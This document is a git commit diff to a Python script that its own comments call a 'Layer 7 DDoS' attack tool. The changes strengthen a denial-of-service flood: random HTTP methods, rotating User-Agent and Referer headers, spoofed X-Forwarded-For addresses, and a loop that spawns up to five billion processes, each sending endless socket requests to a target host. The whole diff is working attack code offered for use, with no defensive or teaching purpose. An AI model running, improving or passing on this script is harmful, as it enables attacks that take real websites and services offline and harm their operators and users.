60ae00ba5f4d430aa73f6be6fec4f9645c7fb37c
Dhwani Patel <59121238+dhwani-git@users.noreply.github.com>
2022-04-08 11:39:48 +0530

    Add files via upload

--- Project.py
+++ Project.py
@@ -7,10 +7,7 @@ import platform
 from headers import headers_useragents
 from referers import headers_referers
 
-print("header",headers_useragents[1])
-print("len",len(headers_referers))
-print(headers_referers[10])
-
+http_met=['OPTIONS' ,'GET' ,'HEAD','PUT','POST','DELETE' ,'PATCH']
 
 '''  Layer 7 DDoS '''
 print("Detecting System...")
@@ -19,7 +16,7 @@ print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 1030000")
+    os.system("ulimit -n 10300000000000")
   except Exception as e:
     print(e)
     print("Could not start the script")
@@ -35,10 +32,11 @@ def randomip():
 def attack():
   while True:
     connection = "Connection:"
+    ua = "User-Agent:" + headers_useragents[random.randint(0,3176)]
     referer = "Referer:" + headers_referers[random.randint(0, 172)]
     forward = "X-Forwarded-For: " + randomip() + "\r\n"
-    get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-    request = get_host + referer  + connection + forward + "\r\n\r\n"
+    get_host = http_met[random.randint(0,6)] + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+    request = get_host + ua + referer  + connection + forward + "\r\n\r\n"
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
@@ -58,7 +56,7 @@ print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(5000000000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
